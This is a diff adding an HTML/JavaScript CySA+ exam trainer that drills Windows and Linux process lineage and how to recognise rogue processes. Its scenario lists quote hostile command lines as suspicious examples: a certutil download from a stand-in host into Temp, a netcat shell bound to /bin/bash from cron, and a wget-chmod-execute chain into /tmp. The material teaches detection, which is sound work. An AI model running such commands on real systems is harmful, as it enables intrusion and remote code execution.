@@ -1,0 +1,336 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CySA+ CS0-004 Process Lineage & Rogue Process Trainer</title>
+<style>
+:root{
+  --bg:#f4f7fb;--panel:#fff;--panel2:#f8fafc;--text:#182230;--muted:#5b6777;--line:#d9e1ea;
+  --accent:#1769aa;--accent2:#eaf3fb;--good:#1f7a45;--goodbg:#eaf7ef;--bad:#b42318;--badbg:#fff0ee;
+  --warn:#9a6700;--warnbg:#fff8db;--chip:#eef3f8;--shadow:0 4px 16px rgba(20,37,63,.08);
+  --code:#9d2c20;
+}
+body.dark{
+  --bg:#10141a;--panel:#181e26;--panel2:#202833;--text:#e7edf5;--muted:#aab5c2;--line:#34404f;
+  --accent:#66b3ff;--accent2:#1b3145;--good:#63d391;--goodbg:#173526;--bad:#ff8178;--badbg:#47211e;
+  --warn:#f1c75b;--warnbg:#3b3117;--chip:#273240;--shadow:none;--code:#ff9b91;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:15px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+header{position:sticky;top:0;z-index:30;display:flex;align-items:center;gap:8px;flex-wrap:wrap;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--line);box-shadow:var(--shadow)}
+header h1{font-size:19px;margin:0}.sub{font-size:13px;color:var(--muted);font-weight:500}.spacer{flex:1}.pill{display:inline-flex;gap:4px;align-items:center;border:1px solid var(--line);background:var(--panel2);padding:5px 9px;border-radius:999px;font-size:12px}
+button,select{font:inherit;color:var(--text);background:var(--panel);border:1px solid var(--line);border-radius:7px;padding:7px 10px;cursor:pointer}button:hover{border-color:var(--accent)}button.primary{background:var(--accent);border-color:var(--accent);color:#fff}button.danger{color:var(--bad)}
+main{display:grid;grid-template-columns:minmax(0,1fr) 365px;gap:14px;max-width:1680px;margin:14px auto;padding:0 14px}.maincol{min-width:0}.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;box-shadow:var(--shadow);padding:14px}.quiz-picker{display:flex;gap:10px;align-items:center;flex-wrap:wrap}.quiz-picker select{min-width:330px;max-width:100%}.desc{color:var(--muted);font-size:13px;flex-basis:100%}.topline{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin:13px 0}.badge{font-size:12px;background:var(--accent2);color:var(--accent);border:1px solid color-mix(in srgb,var(--accent) 35%,var(--line));border-radius:999px;padding:3px 8px}.progress-wrap{display:flex;gap:6px;flex-wrap:wrap}.instructions{background:var(--panel2);border-left:4px solid var(--accent);padding:9px 11px;border-radius:7px;margin:10px 0 13px}.small{font-size:12px;color:var(--muted)}
+.workspace{display:grid;grid-template-columns:minmax(0,1fr) 330px;gap:12px;align-items:start}.stage{min-width:0}.tray{position:sticky;top:78px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:10px;max-height:calc(100vh - 98px);overflow:auto}.tray h3{margin:0 0 5px;font-size:14px}.bank{display:flex;flex-direction:column;gap:7px;min-height:40px}.chip{background:var(--chip);border:1px solid var(--line);border-radius:8px;padding:8px 9px;cursor:grab;user-select:none}.chip:hover{border-color:var(--accent)}.chip.selected{outline:2px solid var(--accent)}.chip.correct{border-color:var(--good);background:var(--goodbg)}.chip.wrong{border-color:var(--bad);background:var(--badbg)}
+.match-grid{display:grid;gap:9px}.match-row{display:grid;grid-template-columns:minmax(155px,240px) minmax(0,1fr);gap:8px;align-items:stretch}.term{border:1px solid var(--line);background:var(--panel2);border-radius:8px;padding:10px;font-weight:700}.dropzone{border:2px dashed var(--line);border-radius:8px;min-height:58px;padding:6px}.dropzone.over,.bucket.over{border-color:var(--accent);background:var(--accent2)}
+.bucket-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}.bucket{border:2px dashed var(--line);border-radius:10px;min-height:160px;padding:9px}.bucket h3{margin:0 0 2px;font-size:15px}.bucket .hint{font-size:12px;color:var(--muted);margin-bottom:8px}.bucket .chip{margin-bottom:7px}
+.controls{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}.feedback{display:none;margin-top:10px;padding:10px;border:1px solid var(--line);background:var(--panel2);border-radius:8px}.feedback.show{display:block}.feedback .big{font-size:17px;font-weight:800}.feedback ul{margin:7px 0 0;padding-left:18px}
+aside{position:sticky;top:76px;align-self:start;max-height:calc(100vh - 90px);overflow:auto}.sidebar-hidden main{grid-template-columns:1fr}.sidebar-hidden aside{display:none}aside h2{font-size:17px;margin:0 0 8px}details{border-top:1px solid var(--line);padding:7px 0}details:first-of-type{border-top:0}summary{font-weight:700;cursor:pointer}.ref-table{width:100%;border-collapse:collapse;margin:7px 0;font-size:12px}.ref-table th,.ref-table td{border:1px solid var(--line);padding:6px;text-align:left;vertical-align:top}.callout{background:var(--accent2);border:1px solid var(--line);border-radius:7px;padding:8px;margin:7px 0;font-size:12px}.callout.warn{background:var(--warnbg)}code{color:var(--code);background:rgba(128,128,128,.11);padding:1px 4px;border-radius:4px}.tree{white-space:pre-wrap;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12px;background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:9px;overflow:auto}.source-note{font-size:11px;color:var(--muted);margin-top:9px}
+.mcq-card{border:1px solid var(--line);border-radius:10px;padding:13px;background:var(--panel2)}.question{font-size:16px;font-weight:750;margin-bottom:10px}.options{display:grid;gap:7px}.opt{text-align:left;width:100%}.opt.sel{outline:2px solid var(--accent)}.opt.correct{border-color:var(--good);background:var(--goodbg)}.opt.wrong{border-color:var(--bad);background:var(--badbg)}.explain{display:none;margin-top:10px;border-top:1px solid var(--line);padding-top:9px}.explain.show{display:block}
+footer{max-width:1680px;margin:0 auto 24px;padding:0 14px;font-size:12px;color:var(--muted)}footer a{color:var(--muted)}
+@media(max-width:1180px){main{grid-template-columns:1fr}aside{position:static;max-height:none}.workspace{grid-template-columns:1fr}.tray{position:static;max-height:none}.bank{display:grid;grid-template-columns:repeat(2,minmax(0,1fr))}}
+@media(max-width:680px){header{position:static}.quiz-picker select{min-width:0;width:100%}.match-row{grid-template-columns:1fr}.bucket-grid{grid-template-columns:1fr}.bank{grid-template-columns:1fr}main{padding:0 8px}.workspace{display:block}.tray{margin-top:10px}}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+<header>
+  <h1>CySA+ CS0-004 · Process Lineage Trainer <span class="sub">Expected Processes · Parent/Child Relationships · Rogue Process Recognition</span></h1>
+  <span class="spacer"></span>
+  <span class="pill">Current: <b id="scorePill">0 / 0</b></span>
+  <span class="pill">Checks: <b id="checksPill">0</b></span>
+  <button id="resetScoreBtn">Reset Score</button>
+  <button id="cheatBtn">📚 Hide Cheats</button>
+  <button id="darkBtn">🌙 Dark</button>
+</header>
+<main id="mainGrid">
+  <section class="maincol">
+    <div class="card">
+      <div class="quiz-picker">
+        <label for="quizSelect"><b>Quiz:</b></label>
+        <select id="quizSelect"></select>
+        <div class="desc" id="quizDesc"></div>
+      </div>
+      <div class="topline">
+        <div><span class="badge" id="modeBadge">Core</span> <strong id="quizTitle"></strong></div>
+        <div class="progress-wrap">
+          <span class="pill">Coverage: <b id="coveragePill">0 / 0</b></span>
+          <span class="pill" id="phasePill">First-pass coverage</span>
+        </div>
+      </div>
+      <div id="quizHost"></div>
+    </div>
+  </section>
+  <aside id="cheats">
+    <div class="card">
+      <h2>Process Lineage Cheat Sheet</h2>
+      <details open>
+        <summary>What the exam is testing</summary>
+        <div class="callout"><b>Do not trust the process name by itself.</b> Check the process's <b>path</b>, <b>parent</b>, <b>privilege/user context</b>, and <b>signature</b>. Dion's memory aid is <b>P-P-P-S</b>.</div>
+        <ul>
+          <li>A legitimate process name in an unusual user-writable path is a red flag.</li>
+          <li>An unexpected parent/child relationship can reveal masquerading or malicious execution.</li>
+          <li>A signed/native binary can still be abused as a LOLBin. Behavior matters.</li>
+          <li>Process creation telemetry such as Windows Event <code>4688</code> and Sysmon Event <code>1</code> helps reconstruct lineage.</li>
+        </ul>
+      </details>
+      <details open>
+        <summary>Windows · high-yield lineage</summary>
+        <div class="tree">System
+└─ smss.exe  (+ lineage anchor)
+   ├─ csrss.exe
+   ├─ wininit.exe
+   │  ├─ services.exe
+   │  │  └─ svchost.exe  ★
+   │  └─ lsass.exe  ★  [normally no ordinary children]
+   └─ winlogon.exe
+
+interactive user shell:
+explorer.exe  ★
+└─ user-launched applications</div>
+        <table class="ref-table">
+          <tr><th>Process</th><th>What to remember</th></tr>
+          <tr><td><code>svchost.exe</code></td><td>Hosts Windows services. Expected parent: <code>services.exe</code>. Expected location: <code>C:\Windows\System32</code>. Multiple instances can be normal.</td></tr>
+          <tr><td><code>lsass.exe</code></td><td>Authentication/security. System32, SYSTEM context. Dion stresses that it should not spawn ordinary child processes.</td></tr>
+          <tr><td><code>explorer.exe</code></td><td>Graphical user shell. Common parent/ancestor for applications opened interactively by the user.</td></tr>
+          <tr><td><code>wininit.exe</code></td><td>Initializes critical Windows subsystems during boot.</td></tr>
+          <tr><td><code>csrss.exe</code></td><td>Essential Client/Server Runtime Subsystem.</td></tr>
+        </table>
+        <div class="small">★ = directly emphasized by the supplied CySA+ study material. + = stable lineage anchor added to make the process tree teachable.</div>
+      </details>
+      <details>
+        <summary>Windows · recurring suspicious patterns</summary>
+        <ul>
+          <li><code>explorer.exe → svchost.exe</code> — wrong parent for svchost.</li>
+          <li><code>WINWORD.EXE / OUTLOOK.EXE / browser → powershell.exe or cmd.exe</code> — source explicitly treats this as malicious/suspicious lineage.</li>
+          <li><code>lsass.exe → child process</code> — critical deviation.</li>
+          <li><code>svchost.exe</code>, <code>lsass.exe</code>, or similar system name under <code>AppData</code>, <code>Temp</code>, or Downloads — masquerading clue.</li>
+          <li><code>PowerShell -EncodedCommand</code>, execution-policy bypass, or a download cradle — suspicious behavior.</li>
+          <li><code>certutil</code> with <code>-urlcache</code>/<code>-decode</code> and external resources; <code>mshta</code>/<code>regsvr32</code> spawning script engines or making network connections.</li>
+        </ul>
+      </details>
+      <details open>
+        <summary>Linux · process anchors</summary>
+        <table class="ref-table">
+          <tr><th>Process</th><th>What to remember</th></tr>
+          <tr><td><code>init / systemd</code></td><td>First userspace process; modern systems usually use systemd as PID 1 to launch/manage services.</td></tr>
+          <tr><td><code>sshd</code></td><td>Handles incoming SSH connections. An authenticated session can lead to a user's shell.</td></tr>
+          <tr><td><code>cron / crond</code></td><td>Runs scheduled tasks; a job commonly spawns a shell/command.</td></tr>
+          <tr><td><code>kthreadd</code></td><td>Kernel-thread manager (commonly PID 2); not an ordinary user-space systemd service.</td></tr>
+          <tr><td><code>systemd-udevd</code></td><td>Handles device events/hardware detection and is managed as a system service.</td></tr>
+        </table>
+        <div class="callout warn"><b>Linux is less rigid for this trainer.</b> Distribution/service-manager differences make many exact parent relationships less universal. Focus on systemd/PID 1, known service roles, execution path, scheduled execution, and obviously anomalous behavior.</div>
+      </details>
+      <details>
+        <summary>Linux · recurring suspicious patterns</summary>
+        <ul>
+          <li>Executable staged or launched from <code>/tmp</code> — common malware staging clue.</li>
+          <li>Executable launched from <code>/dev/shm</code> — important memory-backed/fileless clue in Dion's notes.</li>
+          <li>Unexpected systemd unit in <code>/etc/systemd/system/</code> that launches a hidden or user-writable payload.</li>
+          <li>Process masquerading: a familiar service name running from a user-writable directory.</li>
+          <li>Linux LOLBins such as <code>curl</code>, <code>wget</code>, and <code>nc</code> are not malicious by name; suspicious command behavior and context make the difference.</li>
+        </ul>
+      </details>
+      <details>
+        <summary>Process injection & hollowing</summary>
+        <ul>
+          <li><b>Process injection:</b> malicious code is placed inside a trusted running process. Look for behavior the trusted process should not perform, such as Notepad making network connections.</li>
+          <li><b>Process hollowing:</b> a legitimate process is created/suspended, its memory is replaced, then it resumes. The process name can look normal while its behavior is not.</li>
+        </ul>
+      </details>
+      <details>
+        <summary>Sources & scope</summary>
+        <p class="small"><b>Primary project sources:</b> CompTIA CertMaster Perform (Windows/Linux processes and suspicious/rogue process analysis), Sybex CompTIA CySA+ Study Guide CS0-004 (abnormal OS process behavior / LOLBins), Jason Dion CS0-004 course notes OBJ. 1.2, and the existing File Systems trainer.</p>
+        <p class="small"><b>Supplementation:</b> Stable Windows process-tree relationships (for example, <code>wininit.exe → services.exe → svchost.exe</code>) are included to make the lineage drill coherent. They are marked as lineage anchors rather than presented as an official CompTIA memorization list.</p>
+        <p class="small">The suspicious drills intentionally avoid invented malware names. They use legitimate process names in wrong paths, wrong lineage, or malicious command/behavior contexts.</p>
+      </details>
+    </div>
+  </aside>
+</main>
+<footer class="trainer-footer">
+  <a href="https://github.com/UGL13RTH4NU/CySA-004" target="_blank" rel="noopener noreferrer">↗ CySA-004 Project Repository on GitHub</a>
+</footer>
+<script>
+"use strict";
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>Array.from(r.querySelectorAll(s));
+const shuffle=a=>{const x=[...a];for(let i=x.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[x[i],x[j]]=[x[j],x[i]];}return x};
+const sample=(a,n)=>shuffle(a).slice(0,Math.min(n,a.length));
+
+const MATCH_SETS={
+  winLineage:{
+    section:'1A',title:'Windows · Expected Process Lineage',batch:6,
+    desc:'Primary drill: match each Windows process to its expected role, parent/lineage, and high-yield context. Learn normal before hunting abnormal.',
+    items:[
+      {id:'w-smss',term:'smss.exe  (+)',def:'Session Manager lineage anchor. Starts very early from System and creates session-critical processes such as csrss.exe and the wininit/winlogon branches.'},
+      {id:'w-wininit',term:'wininit.exe  ★',def:'Boot-time process that initializes critical Windows subsystems. In the normal startup tree it sits below smss.exe and starts core infrastructure including services.exe.'},
+      {id:'w-services',term:'services.exe  (+)',def:'Service Control Manager. Normally descends from wininit.exe and launches/manages Windows service processes; it is the expected parent of svchost.exe.'},
+      {id:'w-lsass',term:'lsass.exe  ★',def:'Authentication/security process in System32 running in SYSTEM context. It belongs in the boot-time wininit branch and should not normally spawn ordinary child processes.'},
+      {id:'w-svchost',term:'svchost.exe  ★',def:'Generic host for Windows services. Expected location is C:\\Windows\\System32 and expected parent is services.exe; many simultaneous instances can be normal.'},
+      {id:'w-csrss',term:'csrss.exe  ★',def:'Essential Client/Server Runtime Subsystem. A session-critical process created from the Session Manager (smss.exe) branch.'},
+      {id:'w-winlogon',term:'winlogon.exe  (+)',def:'Interactive logon component associated with a user session; created in the normal Session Manager (smss.exe) session branch.'},
+      {id:'w-explorer',term:'explorer.exe  ★',def:'Windows graphical user shell (desktop/taskbar). Applications launched interactively by the user commonly appear as children/descendants of explorer.exe.'}
+    ]
+  },
+  linuxLineage:{
+    section:'2A',title:'Linux · Expected Process Lineage & Roles',batch:5,
+    desc:'Linux core: learn the service/process anchors CompTIA names, plus only enough lineage to recognize obviously abnormal execution.',
+    items:[
+      {id:'l-systemd',term:'init / systemd  ★',def:'First userspace process; modern distributions usually use systemd as PID 1. It bootstraps the OS and launches/manages user-space services.'},
+      {id:'l-sshd',term:'sshd  ★',def:'SSH service handling incoming remote logins. Typically managed as a service under init/systemd; after successful authentication a session can lead to the user shell.'},
+      {id:'l-cron',term:'cron / crond  ★',def:'Scheduled-task service, typically managed under init/systemd. At the scheduled time it launches the configured command, often through a shell.'},
+      {id:'l-kthread',term:'kthreadd  ★',def:'Kernel-thread manager (commonly PID 2). It belongs to the kernel side of the process tree, not the ordinary user-space systemd service hierarchy.'},
+      {id:'l-udev',term:'udevd / systemd-udevd  ★',def:'Handles device events and hardware detection; normally operates as a system service managed by the init/systemd environment.'},
+      {id:'l-shell',term:'bash / sh  (+)',def:'Common user/job shell. It may appear after an authenticated SSH session, a terminal launch, or a scheduled job; the parent depends on how the shell was started.'}
+    ]
+  }
+};
+
+const OS_ITEMS=[
+  {id:'os-wininit',term:'wininit.exe',bucket:'Windows'},{id:'os-lsass',term:'lsass.exe',bucket:'Windows'},
+  {id:'os-svchost',term:'svchost.exe',bucket:'Windows'},{id:'os-explorer',term:'explorer.exe',bucket:'Windows'},
+  {id:'os-csrss',term:'csrss.exe',bucket:'Windows'},{id:'os-services',term:'services.exe',bucket:'Windows'},
+  {id:'os-winlogon',term:'winlogon.exe',bucket:'Windows'},{id:'os-powershell',term:'powershell.exe',bucket:'Windows'},
+  {id:'os-systemd',term:'systemd / init',bucket:'Linux'},{id:'os-sshd',term:'sshd',bucket:'Linux'},
+  {id:'os-cron',term:'cron / crond',bucket:'Linux'},{id:'os-kthreadd',term:'kthreadd',bucket:'Linux'},
+  {id:'os-udevd',term:'systemd-udevd',bucket:'Linux'},{id:'os-bash',term:'bash / sh',bucket:'Linux'}
+];
+
+const WIN_SCENARIOS=[
+ {id:'ws1',term:'services.exe → C:\\Windows\\System32\\svchost.exe',bucket:'Expected',why:'Expected high-yield lineage: services.exe is the normal parent of svchost.exe, and System32 is the expected location.'},
+ {id:'ws2',term:'explorer.exe → WINWORD.EXE from Program Files after the user opens a document',bucket:'Expected',why:'Explorer commonly launches interactive user applications. The context and path are ordinary.'},
+ {id:'ws3',term:'explorer.exe → chrome.exe from Program Files after the user clicks Chrome',bucket:'Expected',why:'A user-launched application descending from explorer.exe is normal.'},
+ {id:'ws4',term:'wininit.exe → services.exe during system startup',bucket:'Expected',why:'This is a stable Windows startup-tree relationship used here as a lineage anchor.'},
+ {id:'ws5',term:'services.exe → a signed vendor service executable under Program Files',bucket:'Expected',why:'services.exe legitimately launches service processes. The signed Program Files service context is plausible.'},
+ {id:'ws6',term:'explorer.exe → svchost.exe',bucket:'Suspicious',why:'Dion explicitly uses explorer.exe as an abnormal parent for svchost.exe. Investigate masquerading or wrong lineage.'},
+ {id:'ws7',term:'WINWORD.EXE → powershell.exe -EncodedCommand ...',bucket:'Suspicious',why:'Office/document application spawning PowerShell is a recurring high-value malicious pattern; encoded PowerShell strengthens the signal.'},
+ {id:'ws8',term:'OUTLOOK.EXE → cmd.exe /c ...',bucket:'Suspicious',why:'Email client spawning a command shell is an abnormal document/email-to-shell relationship emphasized in the course notes.'},
+ {id:'ws9',term:'chrome.exe → powershell.exe with a download command',bucket:'Suspicious',why:'Browser-to-PowerShell lineage plus download behavior is highly suspicious in the supplied material.'},
+ {id:'ws10',term:'lsass.exe → cmd.exe',bucket:'Suspicious',why:'The source explicitly stresses that LSASS should not spawn ordinary child processes. A command shell child is a critical deviation.'},
+ {id:'ws11',term:'explorer.exe → C:\\Users\\Pat\\AppData\\Roaming\\svchost.exe',bucket:'Suspicious',why:'Both signals are wrong: explorer.exe is an abnormal parent for svchost, and AppData is a user-writable masquerading path.'},
+ {id:'ws12',term:'mshta.exe → powershell.exe while contacting an external URL',bucket:'Suspicious',why:'The notes call out mshta/regsvr32 abuse and recommend alerting when they spawn scripting engines or make network connections.'},
+ {id:'ws13',term:'cmd.exe → certutil.exe -urlcache -split -f https://external.example/payload.bin C:\\Users\\Pat\\AppData\\Local\\Temp\\a.bin',bucket:'Suspicious',why:'Certutil is legitimate, but external download behavior plus a Temp destination is a classic LOLBin-abuse pattern.'},
+ {id:'ws14',term:'C:\\Users\\Pat\\Downloads\\lsass.exe running as the logged-on user',bucket:'Suspicious',why:'A system process name in a user Downloads path and user context is a process-masquerading red flag.'}
+];
+
+const LINUX_SCENARIOS=[
+ {id:'ls1',term:'systemd (PID 1) → sshd from the system SSH service location',bucket:'Expected',why:'sshd is a normal system service and systemd is the service manager on modern distributions.'},
+ {id:'ls2',term:'systemd → systemd-udevd during normal boot/device management',bucket:'Expected',why:'systemd-udevd is the device-event service explicitly named by CertMaster.'},
+ {id:'ls3',term:'cron → /bin/sh → /usr/local/sbin/nightly-backup.sh at the documented backup time',bucket:'Expected',why:'Cron legitimately launches scheduled commands, often through a shell. Known script + expected timing provides baseline context.'},
+ {id:'ls4',term:'sshd → bash immediately after a successful login by a known administrator',bucket:'Expected',why:'An authenticated SSH session can legitimately result in a user shell.'},
+ {id:'ls5',term:'systemd service → /tmp/.update',bucket:'Suspicious',why:'The supplied notes identify /tmp as a common malware staging area. A persistent system service launching a hidden Temp payload deserves investigation.'},
+ {id:'ls6',term:'new /etc/systemd/system/update.service → ExecStart=/dev/shm/.svc',bucket:'Suspicious',why:'Dion calls out malicious systemd units in /etc/systemd/system and /dev/shm as an important memory-backed/fileless execution location.'},
+ {id:'ls7',term:'bash → /tmp/sshd (process name appears as “sshd”)',bucket:'Suspicious',why:'A familiar daemon name launched from a user-writable Temp path is process masquerading, not normal SSH service startup.'},
+ {id:'ls8',term:'cron → /bin/sh → nc -l -p 4444 -e /bin/bash',bucket:'Suspicious',why:'A scheduled job creating a netcat shell is strong malicious behavior. Netcat itself is dual-use; the command context is what matters.'},
+ {id:'ls9',term:'bash → wget external.example/x -O /tmp/.x → chmod +x → /tmp/.x',bucket:'Suspicious',why:'wget is legitimate, but download-to-Temp followed by execution is attacker-like behavior and should be investigated.'},
+ {id:'ls10',term:'user shell → /home/pat/.cache/systemd (renamed executable pretending to be systemd)',bucket:'Suspicious',why:'A system process name executing from a user cache path is a masquerading/path discrepancy.'}
+];
+
+const TRIAGE=[
+ {id:'q1',q:'A process is named svchost.exe. Which single observation is the strongest immediate reason to distrust it?',opts:['There are several svchost.exe instances','It is running from C:\\Users\\Alex\\AppData\\Roaming','Its parent is services.exe','It is digitally signed by Microsoft'],a:'It is running from C:\\Users\\Alex\\AppData\\Roaming',why:'The course repeatedly emphasizes path validation. Legitimate svchost.exe should run from System32; a user-writable AppData copy strongly suggests masquerading.'},
+ {id:'q2',q:'Which parent is expected for a legitimate svchost.exe instance in the course material?',opts:['services.exe','explorer.exe','WINWORD.EXE','lsass.exe'],a:'services.exe',why:'Dion explicitly says legitimate svchost.exe is spawned by services.exe.'},
+ {id:'q3',q:'A process tree shows lsass.exe → powershell.exe. What is the BEST interpretation?',opts:['Normal because LSASS manages authentication','Suspicious because LSASS should not spawn ordinary child processes','Normal if multiple svchost instances are also present','Only suspicious if PowerShell is unsigned'],a:'Suspicious because LSASS should not spawn ordinary child processes',why:'LSASS spawning a child is a high-priority lineage anomaly in the supplied notes.'},
+ {id:'q4',q:'WINWORD.EXE launches powershell.exe with -EncodedCommand. Which clue is most important?',opts:['Document/Office process spawning a shell/scripting engine','PowerShell is installed by Microsoft','The command line contains an .exe extension','Word normally uses a GUI'],a:'Document/Office process spawning a shell/scripting engine',why:'The parent-child relationship is already a major red flag, and encoded PowerShell makes it even stronger.'},
+ {id:'q5',q:'Notepad.exe is Microsoft-signed but suddenly begins making repeated outbound network connections. Which concept BEST fits the source material?',opts:['Possible process injection or hollowing','Normal digital-signature validation','Expected service hosting','Linux daemonization'],a:'Possible process injection or hollowing',why:'Process injection/hollowing can leave a trusted process name intact while its behavior becomes abnormal. A signature alone does not clear it.'},
+ {id:'q6',q:'Which Windows process behavior is NORMAL?',opts:['services.exe spawning svchost.exe from System32','explorer.exe spawning svchost.exe from AppData','OUTLOOK.EXE spawning cmd.exe','lsass.exe spawning powershell.exe'],a:'services.exe spawning svchost.exe from System32',why:'That is the canonical expected parent/path combination in the supplied course notes.'},
+ {id:'q7',q:'Why is “certutil.exe is signed by Microsoft” not enough to declare an execution benign?',opts:['LOLBins are legitimate binaries that attackers can abuse','Signed files cannot access networks','Certutil is always malware','Windows signatures expire after each reboot'],a:'LOLBins are legitimate binaries that attackers can abuse',why:'LOLBin detection is behavior-based. Certutil becomes suspicious with abuse patterns such as external downloads or base64 decoding.'},
+ {id:'q8',q:'On Linux, which finding is the strongest suspicious process/persistence clue?',opts:['A new systemd unit launches /dev/shm/.svc','systemd is PID 1','sshd accepts an authorized SSH connection','cron runs a documented backup script'],a:'A new systemd unit launches /dev/shm/.svc',why:'The notes connect malicious systemd units with persistence and /dev/shm with memory-backed/fileless execution.'},
+ {id:'q9',q:'Which Linux statement is most accurate for this CySA+ trainer?',opts:['Exact parent-child relationships are equally rigid across every distribution','Focus on systemd/PID 1, service roles, paths, scheduled execution, and behavior','Every curl or wget process is malicious','kthreadd is a normal user shell'],a:'Focus on systemd/PID 1, service roles, paths, scheduled execution, and behavior',why:'The project sources name key Linux processes but provide fewer universal lineage rules than Windows. Distribution differences make rigid memorization less useful.'},
+ {id:'q10',q:'Which memory aid does Dion give for evaluating a suspicious process?',opts:['P-P-P-S: Path, Parent, Privileges, Signature','C-I-A: Confidentiality, Integrity, Availability','R-T-O-P: Risk, Threat, Object, Process','L-I-P-T: Location, Identity, Purpose, Timing only'],a:'P-P-P-S: Path, Parent, Privileges, Signature',why:'P-P-P-S is the suspicious-process evaluation aid. L-I-P-T is used nearby for suspicious software evaluation.'},
+ {id:'q11',q:'An analyst needs process-creation telemetry with parent and command-line context on Windows. Which evidence type is directly relevant?',opts:['Windows Event 4688 / Sysmon Event 1','Windows Event 4624 only','DNS MX records','ARP cache entries only'],a:'Windows Event 4688 / Sysmon Event 1',why:'4688 records process creation; Sysmon Event 1 adds rich process creation data including command line, parent information, hashes, and identifiers.'},
+ {id:'q12',q:'A PBQ gives you a process name that looks legitimate. What should you check before trusting the name?',opts:['Path and parent/lineage first, then user/privileges and signature','Only whether the filename ends in .exe','Only CPU utilization','Whether the process icon looks familiar'],a:'Path and parent/lineage first, then user/privileges and signature',why:'This is the core analytic habit taught across CertMaster and Dion: normal-looking names can masquerade; context exposes the discrepancy.'}
+];
+
+const QUIZZES=[
+ {id:'winLineage',name:'1A · Windows — Expected Process Lineage',type:'match',badge:'Core · Windows'},
+ {id:'linuxLineage',name:'2A · Linux — Expected Process Lineage',type:'match',badge:'Core · Linux'},
+ {id:'osSort',name:'Mixed · Sort Windows vs Linux Processes',type:'bucket',badge:'Recall · Platform'},
+ {id:'winSusp',name:'3A · Windows — Expected vs Suspicious',type:'bucket',badge:'Discriminate · Windows'},
+ {id:'linuxSusp',name:'3B · Linux — Expected vs Suspicious',type:'bucket',badge:'Discriminate · Linux'},
+ {id:'triage',name:'4 · Exam-Style Process Triage',type:'mcq',badge:'Exam · Triage'}
+];
+const DEF={
+ osSort:{section:'Mixed',title:'Sort Windows vs Linux Processes',batch:8,desc:'Classify process names by platform. The set progresses through every item before fully random repetition.',items:OS_ITEMS,buckets:[['Windows','Windows processes'],['Linux','Linux processes']]},
+ winSusp:{section:'3A',title:'Windows · Expected vs Suspicious Process Relationships',batch:7,desc:'Classify real process relationships and execution contexts. No invented malware names: suspicion comes from lineage, path, or behavior.',items:WIN_SCENARIOS,buckets:[['Expected','Normal / plausible in the stated context'],['Suspicious','Wrong lineage, path, or behavior — investigate']]},
+ linuxSusp:{section:'3B',title:'Linux · Expected vs Suspicious Process Relationships',batch:6,desc:'Classify Linux service/process contexts using systemd, SSH, cron, execution paths, /tmp, /dev/shm, and LOLBin behavior.',items:LINUX_SCENARIOS,buckets:[['Expected','Normal / plausible in the stated context'],['Suspicious','Unexpected path, persistence, or command behavior']]},
+ triage:{section:'4',title:'Exam-Style Process Triage',batch:1,desc:'One scenario at a time. Choose the BEST interpretation based on process lineage, path, behavior, and telemetry.',items:TRIAGE}
+};
+
+const STORAGE_KEY='cysa004-process-lineage-trainer-v1';
+const state={quiz:'winLineage',current:[],checks:0,lastScore:0,lastTotal:0,selectedChip:null,mcqPick:null};
+function setDef(q=state.quiz){return MATCH_SETS[q]||DEF[q]}
+function validIds(q){return new Set(setDef(q).items.map(x=>x.id))}
+function loadProgress(){
+ let raw={};try{raw=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}')}catch(e){raw={}}
+ const out={};for(const q of QUIZZES.map(x=>x.id)){const v=validIds(q);out[q]=(Array.isArray(raw[q])?raw[q]:[]).filter(id=>v.has(id))}return out
+}
+let progress=loadProgress();
+function saveProgress(){try{localStorage.setItem(STORAGE_KEY,JSON.stringify(progress))}catch(e){}}
+function currentSeen(){return new Set(progress[state.quiz]||[])}
+function nextItems(){
+ const d=setDef(),seen=currentSeen(),unseen=d.items.filter(x=>!seen.has(x.id)),n=Math.min(d.batch||1,d.items.length);let chosen=[];
+ if(!unseen.length) chosen=sample(d.items,n);
+ else if(unseen.length>=n) chosen=sample(unseen,n);
+ else {chosen=[...unseen];const filler=d.items.filter(x=>!chosen.some(c=>c.id===x.id));chosen.push(...sample(filler,n-chosen.length));chosen=shuffle(chosen)}
+ chosen.forEach(x=>seen.add(x.id));progress[state.quiz]=[...seen];saveProgress();return chosen
+}
+function updateHeader(){
+ const d=setDef(),seen=currentSeen(),q=QUIZZES.find(x=>x.id===state.quiz);
+ $('#scorePill').textContent=`${state.lastScore} / ${state.lastTotal}`;$('#checksPill').textContent=state.checks;
+ $('#coveragePill').textContent=`${seen.size} / ${d.items.length}`;$('#phasePill').textContent=seen.size>=d.items.length?'Full random mode':'First-pass coverage';
+ $('#quizTitle').textContent=d.title;$('#quizDesc').textContent=d.desc;$('#modeBadge').textContent=q.badge;
+}
+function clearSelection(){state.selectedChip?.classList.remove('selected');state.selectedChip=null}
+function clearGradeStyles(root=document){$$('.correct,.wrong',root).forEach(x=>x.classList.remove('correct','wrong'));$('#feedback')?.classList.remove('show')}
+function mkChip(item,text,answer,mode,homeId='bank'){
+ const c=document.createElement('div');c.className='chip';c.draggable=true;c.textContent=text;c.dataset.itemId=item.id;c.dataset.answer=answer;c.dataset.mode=mode;c.dataset.home=homeId;c.id='chip-'+item.id+'-'+Math.random().toString(36).slice(2,7);
+ c.addEventListener('dragstart',e=>{e.dataTransfer.setData('text/plain',c.id);c.style.opacity='.55'});c.addEventListener('dragend',()=>c.style.opacity='1');
+ c.addEventListener('click',()=>{
+   if(c.parentElement?.classList.contains('dropzone')||c.parentElement?.classList.contains('bucket')){homeChip(c);clearGradeStyles();return}
+   clearSelection();state.selectedChip=c;c.classList.add('selected');
+ });return c
+}
